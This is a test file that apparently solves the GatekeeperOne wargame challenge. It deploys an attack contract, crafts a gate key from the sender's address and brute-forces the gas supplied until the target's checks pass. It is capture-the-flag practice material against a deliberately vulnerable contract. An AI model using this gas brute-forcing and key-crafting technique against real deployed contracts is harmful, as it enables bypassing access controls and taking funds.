import { expect } from "chai";
import { BigNumber, Contract, Signer } from "ethers";
import { ethers } from "hardhat";
import { createChallenge, submitLevel } from "./utils";
import { loadFixture } from "@nomicfoundation/hardhat-network-helpers";

let accounts: Signer[];
let eoa: Signer;
let attacker: Contract;
let challenge: Contract; // challenge contract
let tx: any;

describe("GateKeeperOne", function () {

    async function deployTokenFixture(): Promise<any> {
        accounts = await ethers.getSigners();
        [eoa] = accounts;
        const challengeFactory = await ethers.getContractFactory(`GatekeeperOne`);
        const challengeAddress = await createChallenge(
            `0x2a2497aE349bCA901Fea458370Bd7dDa594D1D69`, ethers.utils.parseEther("1.0")
        );
        challenge = await challengeFactory.attach(challengeAddress);

        const attackerFactory = await ethers.getContractFactory(`GateKeeperOneAttack`);
        attacker = await attackerFactory.deploy(challenge.address);

        return { eoa, challenge, attacker };
    }

    it("solves the challenge", async function () {
        const { eoa, challenge, attacker } = await loadFixture(deployTokenFixture);

        try {
            const gateKey = eoa.address.slice(38).padStart(8, "0").padStart(16, eoa.address.slice(2, 18)).padStart(18, "0x“");
            console.log("gateKey: " + gateKey)

            const MOD = 8191
            const gasToUse = 800000
            for (let i = 0; i < MOD; i++) {
                console.log(`testing ${gasToUse + i}`)
                try {
                    tx = await attacker.attack(gateKey, gasToUse + i, {
                        gasLimit: `950000`
                    });
                    break;
                } catch { }
            }
            // console.log({receipt});
        } catch (err) {
            console.log("error: " + err);
        }


    });

    after(async () => {
        expect(await submitLevel(challenge.address), "level not solved").to.be.true;
    });
});
